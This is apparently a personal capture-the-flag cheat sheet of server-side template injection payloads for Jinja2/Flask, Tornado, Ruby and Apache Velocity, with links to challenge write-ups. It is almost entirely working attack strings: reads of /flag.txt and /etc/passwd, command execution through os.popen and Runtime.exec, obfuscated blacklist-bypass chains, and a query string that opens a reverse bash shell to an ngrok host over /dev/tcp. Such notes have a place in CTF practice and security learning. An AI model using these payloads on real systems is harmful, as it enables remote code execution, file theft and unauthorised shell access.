---
title: "Ssti (Web)"
category: "web"
subcategory: "ssti"
type: "technique"
tags: ["my-notes", "personal", "ssti", "jinja2", "flask", "exec", "web"]
summary: "https://lexsd6.github.io/2022/03/26/HTB-babyninjajinja-web-challenge-wp/"
source:
  name: "Personal notes"
origin_path: "Web/SSTI.md"
---

# Payload

```bash
${open('/flag.txt').read()}
```

### Resources
[https://lexsd6.github.io/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/](https://lexsd6.github.io/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/)

> **Info** 关于jinja2特性对ssti的bypass的影响
> 之前写了一篇关于python ssti的文章,但在分析时过于肤浅地将重心放在python与flask上,从而完全忽视了对jinja2的深入探讨。实际上我们在flask中用{ {与{ %在进行执行python逃逸时并不是直接给python引擎处理,而是要先经过jinja2’渲染’一道.因此这是对之前不足的整理.  
> [https://lexsd6.github.io/2020/11/27/关于jinja特性对ssti的bypass的影响/](https://lexsd6.github.io/2020/11/27/关于jinja特性对ssti的bypass的影响/)  

[https://lexsd6.github.io/2020/03/27/python 关于沙盒逃逸的思考/](https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/)
### Cobalt SSTI Payload
```
${{<%[%'"}}%\.
```

# PAYLOADS
## Tornado
```bash
{% import os %}{{ os.popen("whoami").read() }}
```

## Ruby SSTI
```ruby
<%= IO.popen('ls /').readlines() %>
```

# Resources
-> https://github.com/Marven11/Fenjing

```
{% set exploit = ((lipsum,)|map(**{"at""tribute" : "\x5F\x5Fglo""bals\x5F\x5F"})|map(**{"at""tribute" : "\x5F\x5Fbui""ltins\x5F\x5F"})|map(**{"at""tribute" : "ev""al"})|max)("\x5F\x5Fimp""ort\x5F\x5F('os')\x2Epop""en('cat /etc/passwd')\x2Ere""ad()") %}{%print(exploit)%}
```

```py
{for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__ == 'P' 'o' 'p' 'e' 'n' %}{{ c('id',shell=True,stdout=-1).communicate()[0] }}{% endif %}{% endfor %} 
```
# BLACKLIST FULL BYPASS
-> https://ctf.zeyu2001.com/2022/securinets-ctf-finals-2022/strong
-> https://adragos.ro/securinets-2022/#wafbypass
```python
{% if (request|attr(request|attr('args')|attr('get')('a'))|attr(request|attr('args')|attr('get')('b'))|attr('get')(request|attr('args')|attr('get')('c'))|attr('get')(request|attr('args')|attr('get')('d')))(request|attr('args')|attr('get')('e'))|attr(request|attr('args')|attr('get')('f'))(request|attr('args')|attr('get')('g'))|attr(request|attr('args')|attr('get')('i'))() %} a {% endif %}
```

```
?a=application&b=__globals__&c=__builtins__&d=__import__&e=os&f=popen&g=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/4.tcp.eu.ngrok.io/15788+0>%261'
```

```
trick: ${PWD%....}
```
# VELOCITY SSTI
```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("ls /"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor() )
#foreach($i+in+[1..$out.available()])
$out.read()
#end
```
**Reference:** Labyrinth Linguist - HackTheBox
-> https://www.linkedin.com/pulse/apache-velocity-server-side-template-injection-marjan-sterjev/
-> https://www.youtube.com/watch?v=EGItzKCxTdQ&t=4661s&ab_channel=SloppyJoePiratesCTFWriteups

---

```python
{%for SAFE in ().__class__.__base__.__subclasses__()%}{%if "warning" in SAFE.__name__%}{{SAFE()._module.__builtins__['__import__']('os').popen("cat /flag.txt").read()}}{%endif%}{% endfor %}
```

---

*From your own notes: `Web/SSTI.md`*
